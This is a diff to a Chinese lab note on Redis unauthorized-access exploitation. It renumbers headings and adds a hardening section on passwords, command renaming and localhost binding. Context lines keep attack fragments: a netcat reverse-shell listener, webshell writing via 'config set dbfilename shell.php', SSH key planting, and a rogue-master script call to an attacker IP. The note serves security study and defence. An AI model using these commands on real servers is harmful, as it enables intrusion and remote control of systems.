@@ -48,7 +48,7 @@ ss -antpl
 
 
 
-### :heart_eyes_cat:写入计划任务获取反弹shell
+### 1、写入计划任务获取反弹shell
 
 > 由于Redis存在未授权访问漏洞，所以无需账号密码就可以在我们的Redis目录下去远程控制靶机的Redis数据库，但是我们希望不仅仅是可以操作对方的Redis数据库，想提权去控制服务器，比较容易想到的就是想办法写个反弹shell，让靶机来连接我们，如果可以成功反弹，我们就可以提权。我们想到可以让靶机设定一个定时来连接攻击机的计划任务，从而实现反弹；但是写计划任务是需要在计划任务的目录`/var/spool/cron`中去执行命令，而我们现在只能操作数据库，根本没办法去进入到服务器的计划任务目录，更别说是写计划任务。
 >
@@ -122,7 +122,7 @@ nc -lvp 6868
 
 
 
-### :heart_eyes_cat:利用SSH写公钥，免密登陆
+### 2、利用SSH写公钥，免密登陆
 
 > 前提条件：目标机器开启了ssh服务，且以root权限启动redis
 
@@ -157,7 +157,7 @@ save # 将数据保存在目标服务器硬盘上
 
 ![image-20231019205507935](./imgs/image-20231019205507935.png)
 
-### :heart_eyes_cat:利用Redis写WebShell
+### 3、​利用Redis写WebShell
 
 > 前提条件：需要对方开启了web服务和知道web路径，并有读写权限。
 >
@@ -170,7 +170,7 @@ config set dbfilename shell.php
 save
 ```
 
-### :heart_eyes_cat:Redis未授权执行系统命令
+### 4、Redis未授权执行系统命令
 
 环境：`/vulhub/vulhub/redis/4-unacc`
 
@@ -230,3 +230,68 @@ python3 redis-master.py -r 127.0.0.1 -p 6379 -L 192.168.80.141 -P 8888 -f RedisM
 ## 1.5、参考
 
 - [面试经典 Redis未授权漏洞与组合拳](https://www.freebuf.com/vuls/349094.html)
+
+## 1.6、加固
+
+1、 添加密码认证，设置强密码（重启Redis后生效）
+
+```
+redis默认没有开启密码认证
+修改/etc/redis/redis.conf配置文件， （requirepass 密码）可设置认证密码
+
+[root@localhost ~]# vim /etc/redis.conf
+requirepass xHlotFav5VNz9&yH
+
+重启redis（/etc/init.d/redis-server restart）之后，需要执行（auth 密码）
+示例如下：
+
+[root@eureka175 ~]# redis-cli -h 192.168.65.175 -p 6379
+192.168.65.175:6379> 
+192.168.65.175:6379> KEYS *
+(error) NOAUTH Authentication required.
+192.168.65.175:6379> AUTH 1234
+(error) ERR invalid password
+192.168.65.175:6379> AUTH xHlotFav5VNz9&y1
+OK
+```
+
+
+
+2、 修改默认端口
+
+3、 禁止或重命名一些Redis高危命令（重启Redis后生效）
+
+ ```bash
+ 由于redis没有做基本的权限分离，无管理账号和普通账号之分，导致攻击者登录后可执行任意操作，因此需要隐藏重要命令。
+ 例如：FLUSHDB, FLUSHALL, KEYS,PEXPIRE, DEL, CONFIG, SHUTDOWN, BGREWRITEAOF, BGSAVE, SAVE, SPOP, SREM, RENAME,DEBUG, EVAL
+ 
+ 其中在redis2.8.1和RedisRedis3.x (< 3.0.2)存在有eval沙箱逃逸漏洞，攻击者利用漏洞可执行任意lua代码。
+ 
+ 设置方法如下，编辑redis.conf文件：
+ 
+ rename-command CONFIG ""
+ rename-command flushall ""
+ rename-command flushdb ""
+ rename-command shutdown shutdown_dvwa
+ 
+ 
+ 上述配置将config，flushdb，flushall设置为了空，即禁用该命令，我们也可以命名为一些攻击者难以猜测，我们自己却容易记住的的名字。
+ 
+ /etc/init.d/redis-server restart 
+ ```
+
+
+
+4、 以低权限启用Redis（重启Redis后生效）
+
+5、 设置防火墙策略
+
+6、网络加固
+
+```bash
+绑定127.0.0.1，redis默认是监听的127.0.0.1上，如果仅仅是本地通信，请确保监听在本地。这种方式缓解了redis的风险。在/etc/redis/redis.conf中配置如下：
+
+[root@localhost ~]# vim /etc/redis.conf
+bind127.0.0.1
+```
+
